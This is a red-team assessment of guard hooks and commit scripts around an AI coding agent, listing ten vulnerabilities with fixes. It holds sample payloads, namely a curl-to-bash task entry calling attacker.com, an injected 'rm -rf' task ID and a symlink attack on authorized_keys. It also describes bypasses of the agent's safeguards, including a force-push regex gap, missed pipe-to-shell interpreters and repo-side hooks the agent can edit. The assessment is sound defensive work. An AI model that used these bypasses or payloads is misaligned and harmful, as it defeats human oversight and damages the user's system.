# Red Team Assessment

## CRITICAL

### 1. Arbitrary Code Execution — `pre-commit.sh:71`

```python
result = subprocess.run(verify, shell=True, ...)
```

The `verify` field from `.ai/tasks.json` is executed as a shell command without any sanitization. Anyone who can write to `.ai/tasks.json` (the file is unprotected, world-writable by design) can execute arbitrary commands on the next `git commit`. This is a full RCE vector. A malicious task entry like:

```json
{"id": "1", "verify": "curl attacker.com/x | bash", "status": "pending"}
```

...would silently execute on commit. The guard hooks (scope-guard, destructive-bash-guard) do not intercept Python subprocess calls — they only cover Claude's `Bash` and `Edit`/`Write` tools.

---

### 2. Shell Injection via Task ID — `pre-commit.sh:75`

```python
subprocess.run(f"ai-task update {tid} done", shell=True, ...)
```

`tid` comes directly from `task["id"]` in tasks.json with no sanitization. A task ID like `1; rm -rf ~/important_dir` would execute as `ai-task update 1; rm -rf ~/important_dir done`. This is compounded by the fact tasks.json is mutable and unsigned.

---

## HIGH

### 3. `git push origin main --force` Bypasses Hard Deny — `destructive-bash-guard.sh:80-84`

The hard deny pattern:
```
git[[:space:]]+push[[:space:]]+.*--force[[:space:]]+.*\b(main|master)\b
```

Requires `--force` to appear **before** the branch name. The common invocation `git push origin main --force` (branch before flag) does **not** match this pattern and falls through to the soft-deny at line 117, which only escalates to `ask`. Force-pushing main would get an "ask" rather than an unconditional "deny".

**Bypass:** `git push origin main --force` → only gets asked, not denied.

---

### 4. Hook Protection Doesn't Cover Repo-Side Hooks — `scope-guard.sh:53`

```bash
if echo "$FILE_NORM" | grep -qE '(\.claude/hooks/|\.claude-work/hooks/).*\.(sh|json)$'
```

The hook directory `hooks/` in the repo is **symlinked** to `~/.claude/hooks/`. When Claude writes to a hook file, the `FILE_PATH` from the tool call will be the repo-side path (`/c/users/ericm/personal_projects/.ai/hooks/destructive-bash-guard.sh`), not the `~/.claude/hooks/...` path. This check never matches repo-side paths, so **Claude can modify its own guard hooks directly** during a session. Since the symlink makes the repo file the real file, the edit takes effect immediately on the next hook invocation.

---

## MEDIUM

### 5. Predictable Temp File — `stop-checkpoint.sh:57`

```bash
_CLAIM_TMP=$(mktemp 2>/dev/null || echo "/tmp/runecho-claims-$$")
echo "$_LAST_MSG" > "$_CLAIM_TMP"
```

If `mktemp` fails, the fallback uses the process PID as a suffix — predictable on Linux. A local attacker can pre-create a symlink at `/tmp/runecho-claims-<PID>` pointing to any file the hook owner can write (e.g., `~/.bashrc`, `~/.ssh/authorized_keys`). The hook then writes Claude's last assistant message to the symlink target — content-controlled if a prompt injection attack is in play.

---

### 6. Classifier Log Stores User Prompts — `classifier.go:189`

```go
entry := schema.ClassifierEntry{
    Prompt: prompt,  // first 200 chars of every user message
    ...
}
// written to ~/.claude/hooks/.governor-state/classifier-log.jsonl
```

Every user prompt's first 200 characters are persisted to disk as plaintext. The log file is in a predictable location with default 0644 permissions (any local user can read it). On a shared or multi-user system this is a confidentiality leak of all user queries.

---

### 7. Pipe-to-Shell Pattern Incomplete — `destructive-bash-guard.sh:127`

```bash
if echo "$CMD_NORM" | grep -qE '(curl|wget)[[:space:]].*[|][[:space:]]*(bash|sh|zsh|python|node)|eval[[:space:]]*"\$\(curl'
```

Only guards `bash|sh|zsh|python|node`. Misses: `ruby`, `perl`, `php`, `pwsh`, `bun`, `deno`, `python3`, `node.exe`. A pipe-to-`ruby` or pipe-to-`pwsh` RCE is silently allowed.

---

### 8. Unsanitized `ev.Cwd` Used in File Ops — `sessionend/end.go:43`

```go
ev := parseEvent(input)
cwd := ev.Cwd
// ...
handoffPath := filepath.Join(cwd, ".ai", "handoff.md")
os.MkdirAll(filepath.Dir(handoffPath), 0755)
os.WriteFile(handoffPath, content, 0644)
exec.Command("git", "-C", cwd, "diff", "--name-only", "HEAD")
```

`ev.Cwd` comes from untrusted JSON on stdin. If tampered (e.g., via prompt injection into the session-end event), a path like `../../etc` would be used in all file operations. `filepath.Join` does not sanitize traversal components. This is a path traversal if the input channel is compromised.

---

## LOW

### 9. Audit Log Silently Drops Entries — `destructive-bash-guard.sh:26`, `scope-guard.sh:32`

```bash
echo "{...,\"command\":$(echo "$COMMAND" | jq -Rs .)}" >> "$STATE_DIR/safety-audit.jsonl"
```

If `jq` is not in PATH or fails, the `|| true` swallows the error. The security check still runs, but the audit trail entry is silently lost. Detection/forensics rely on an unreliable log.

---

### 10. Non-Numeric `value` Silently Drops Fault Signals — `fault-emitter.sh:36`

```bash
--argjson value "${value:-0}"
```

If `value` is non-numeric, `jq` rejects `--argjson` and the whole command fails silently (`|| true`). The fault is dropped rather than recorded with a fallback value. Fault signals can be silently lost under certain input conditions.

---

## Summary Table

| # | Severity | Location | Issue |
|---|----------|----------|-------|
| 1 | CRITICAL | `pre-commit.sh:71` | `verify` field executed with `shell=True` — RCE from tasks.json |
| 2 | CRITICAL | `pre-commit.sh:75` | Task ID interpolated into `shell=True` command — injection |
| 3 | HIGH | `destructive-bash-guard.sh:80` | `git push origin main --force` bypasses hard deny |
| 4 | HIGH | `scope-guard.sh:53` | Repo-side `hooks/` dir not protected — Claude can edit its own guards |
| 5 | MEDIUM | `stop-checkpoint.sh:57` | Predictable PID-based temp file fallback — symlink attack |
| 6 | MEDIUM | `classifier.go:189` | All prompts (first 200 chars) logged to 0644 file |
| 7 | MEDIUM | `destructive-bash-guard.sh:127` | Pipe-to-shell misses ruby, perl, pwsh, bun, deno |
| 8 | MEDIUM | `sessionend/end.go:43` | Unsanitized `cwd` from stdin JSON used in file ops |
| 9 | LOW | `destructive-bash-guard.sh:26` | Audit log silently drops entries if jq fails |
| 10 | LOW | `fault-emitter.sh:36` | Non-numeric `value` silently drops fault signals |

---

## Highest Priority Fixes

1. **#1 & #2** — sanitize task IDs (alphanumeric + hyphen only) and never pass `verify` to `shell=True`. Use `shlex.split` + a list, or validate against an allowlist of safe patterns.
2. **#3** — extend the hard deny regex to also match `git push .*(main|master).*(--force|-f)` (flag after branch name).
3. **#4** — resolve symlinks in scope-guard before checking paths, or add the canonical repo `hooks/` path to the always-on protection list.
